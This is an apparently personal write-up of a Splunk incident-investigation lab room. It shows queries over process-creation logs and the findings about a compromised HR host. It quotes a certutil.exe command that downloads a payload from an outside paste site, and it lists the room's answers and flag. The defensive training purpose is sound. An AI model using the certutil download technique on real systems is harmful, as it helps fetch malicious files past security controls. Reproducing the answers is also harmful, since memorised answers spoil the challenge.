# Benign

## Overview

This room is a challenge-style investigation continuing directly from the Splunk skills built in Log Analysis with SIEM and Alert Triage With Splunk. An IDS alert flagged suspicious process execution on a host in the HR department. Only process execution logs (Windows Event ID 4688) were available, ingested into Splunk's `win_eventlogs` index, requiring the investigation to be built entirely around process creation events and their command lines.

## Task 2 - Scenario: Identify and Investigate an Infected Host

Investigated suspicious process execution across a three-department network (IT, HR, Marketing) using Splunk's `win_eventlogs` index. Scoped the investigation to March 2022, then identified an imposter/typo-squatted user account hiding among legitimate usernames. Traced scheduled task activity (schtasks.exe) to a specific HR user, then pivoted to LOLBin usage (certutil.exe) by a second HR user to identify the full download chain: the file-sharing site used as C2 infrastructure, the exact date of execution, the payload filename saved locally, and the malicious content embedded in the downloaded file.

Queries used:

```
index=win_eventlogs
| dedup UserName
| table UserName

index=win_eventlogs schtasks.exe
| table UserName CommandLine

index=win_eventlogs certutil.exe
| table UserName CommandLine _time
```

![Task 2 Answers](Screen%20Shot%202026-07-30%20at%2012.23.03%20AM.png)

**Findings:**

- Logs ingested from the month of March 2022: 13959
- Imposter account name: Amel1a (a typosquat of the legitimate user Amelia)
- HR user observed running scheduled tasks: Chris.fort
- HR user who executed a LOLBIN to download a payload from a file-sharing host: haroon
- LOLBIN used to bypass security controls: certutil.exe
- Date the binary was executed by the infected host: 2022-03-04
- Third-party site accessed to download the malicious payload: controlc.com
- File saved on the host machine from the C2 server: benign.exe
- Malicious content pattern found in the downloaded file: THM{KJ&*H^B0}
- URL the infected host connected to: https://controlc.com/e4d11035

Command line identified:

```
certutil.exe -urlcache -f https://controlc.com/e4d11035 benign.exe
```

## Key Takeaways

- With only process execution logs (Event ID 4688) available, this investigation had to rely entirely on command-line content, username, and timestamp correlation, no network logs, no file logs, just process creation events. That constraint mirrors real-world scenarios where logging coverage is incomplete and analysts have to extract maximum value from whatever data they do have.
- Typosquatted usernames (Amel1a vs Amelia) are a persistence and evasion technique that shows up repeatedly across the SOC Level 1 path, whether in filenames (SharePoInt.exe), process names (scvhost.exe), or here, user accounts. Spotting these requires deliberately checking rare/uncommon field values rather than skimming a list of familiar-looking names.
- certutil.exe is one of the most consistently abused LOLBins across this entire learning path (it also appeared in the Windows Threat Detection and Living Off the Land rooms), reinforcing that a small set of legitimate, signed Windows binaries account for a disproportionate share of real-world download-and-execute abuse.
- Cross-referencing organizational context (the IT/HR/Marketing department breakdown) against technical findings was essential to this investigation. Multiple users triggered similar-looking activity, but only checking department membership against the alert's HR focus correctly narrowed down which user mattered at each stage.
- The full attack chain reconstructed here (schtasks.exe scheduled task activity, then a separate LOLBin download via certutil.exe to a public paste site, then a locally saved payload) demonstrates that a single compromised department can produce multiple distinct, investigatable artifacts, and that correlating username, command line, and timestamp across all of them is what turns isolated log entries into a complete incident narrative.
